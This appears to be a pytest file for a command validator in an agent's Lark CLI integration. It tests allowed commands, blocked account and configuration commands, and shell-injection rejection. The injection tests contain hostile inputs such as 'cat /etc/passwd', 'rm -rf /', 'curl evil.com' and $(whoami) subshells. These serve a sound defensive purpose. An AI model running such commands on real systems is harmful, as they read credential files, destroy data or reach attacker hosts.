"""Tests for _lark_command_security — whitelist, blocklist, and shell injection."""

import pytest

from xyz_agent_context.module.lark_module._lark_command_security import (
    validate_command,
    sanitize_command,
)


# =====================================================================
# validate_command — allowed commands
# =====================================================================

class TestValidateCommandAllowed:
    def test_im_send(self):
        ok, _ = validate_command('im +messages-send --user-id ou_xxx --text "hello"')
        assert ok

    def test_contact_search(self):
        ok, _ = validate_command("contact +search-user --query John")
        assert ok

    def test_calendar_agenda(self):
        ok, _ = validate_command("calendar +agenda")
        assert ok

    def test_docs_create(self):
        ok, _ = validate_command('docs +create --as bot --title "Title" --markdown "# Content"')
        assert ok

    def test_schema_lookup(self):
        ok, _ = validate_command("schema im.messages.create")
        assert ok

    def test_api_post_with_json(self):
        ok, _ = validate_command(
            'api POST /open-apis/contact/v3/users/batch_get_id '
            '--data \'{"emails":["x@y.com"]}\''
        )
        assert ok

    def test_auth_status(self):
        ok, _ = validate_command("auth status")
        assert ok

    def test_doctor(self):
        ok, _ = validate_command("doctor")
        assert ok

    def test_im_help(self):
        ok, _ = validate_command("im +messages-send --help")
        assert ok


# =====================================================================
# validate_command — blocked commands
# =====================================================================

class TestValidateCommandBlocked:
    def test_empty(self):
        ok, reason = validate_command("")
        assert not ok
        assert "Empty" in reason

    def test_whitespace_only(self):
        ok, reason = validate_command("   ")
        assert not ok

    def test_config_init(self):
        ok, reason = validate_command("config init --app-id xxx")
        assert not ok
        assert "config init" in reason

    def test_config_remove(self):
        ok, reason = validate_command("config remove myprofile")
        assert not ok

    def test_profile_remove(self):
        ok, reason = validate_command("profile remove agent_123")
        assert not ok

    def test_auth_login(self):
        ok, reason = validate_command("auth login --recommend")
        assert not ok
        assert "dedicated MCP tool" in reason

    def test_auth_logout(self):
        ok, reason = validate_command("auth logout")
        assert not ok

    def test_event_subscribe(self):
        ok, reason = validate_command("event +subscribe")
        assert not ok

    def test_update_self(self):
        ok, reason = validate_command("update")
        assert not ok

    def test_unknown_domain(self):
        ok, reason = validate_command("rm -rf /")
        assert not ok
        assert "Unknown command domain" in reason

    def test_auth_only_read_subcommands(self):
        ok, _ = validate_command("auth status")
        assert ok
        ok, _ = validate_command("auth delete")
        assert not ok

    def test_blocked_flag_app_secret(self):
        ok, reason = validate_command("config init --app-secret mytoken")
        assert not ok


# =====================================================================
# validate_command — shell injection
# =====================================================================

class TestValidateCommandInjection:
    def test_pipe(self):
        ok, _ = validate_command("im +messages-send | cat /etc/passwd")
        assert not ok

    def test_semicolon(self):
        ok, _ = validate_command("doctor; rm -rf /")
        assert not ok

    def test_ampersand(self):
        ok, _ = validate_command("doctor & curl evil.com")
        assert not ok

    def test_backtick(self):
        ok, _ = validate_command("im +messages-send --text `whoami`")
        assert not ok

    def test_dollar_subshell(self):
        ok, _ = validate_command("im +messages-send --text $(whoami)")
        assert not ok

    def test_curly_braces_allowed(self):
        """Curly braces are allowed for JSON data."""
        ok, _ = validate_command('api POST /path --data {"key":"value"}')
        assert ok

    def test_square_brackets_allowed(self):
        """Square brackets are allowed for JSON arrays."""
        ok, _ = validate_command('api POST /path --data ["a","b"]')
        assert ok


# =====================================================================
# sanitize_command
# =====================================================================

class TestSanitizeCommand:
    def test_simple(self):
        args = sanitize_command("im +messages-send --text hello")
        assert args == ["im", "+messages-send", "--text", "hello"]

    def test_quoted_string(self):
        args = sanitize_command('im +messages-send --text "hello world"')
        assert args == ["im", "+messages-send", "--text", "hello world"]

    def test_blocked_raises(self):
        with pytest.raises(ValueError, match="config init"):
            sanitize_command("config init --app-id xxx")

    def test_empty_raises(self):
        with pytest.raises(ValueError, match="Empty"):
            sanitize_command("")
